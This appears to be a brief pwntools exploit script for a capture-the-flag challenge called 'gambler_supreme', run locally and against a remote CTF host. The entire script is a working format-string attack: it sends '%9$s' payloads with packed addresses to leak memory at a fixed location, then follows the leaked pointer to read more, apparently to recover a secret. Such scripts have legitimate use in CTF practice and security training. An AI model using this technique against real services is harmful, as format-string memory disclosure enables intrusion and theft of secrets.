from pwn import *
context.log_level = "Debug"
io = process("./gambler_supreme")
io = remote("ctf.b01lers.com", 9201)
# gdb.attach(io)

io.sendline("1")
io.sendline("%9$sAAAA" + p64(0x404050))
print(io.recvuntil("Your guess: "))
addr = u64(io.recvline()[:4].ljust(8, '\x00'))
log.info("Addr: " + hex(addr))

io.recvuntil("lowercase letters:")
io.sendline("%9$sAAAA" + p64(addr))
io.recvuntil("Your guess:")
#network io
io.recv()
log.info(io.recv())
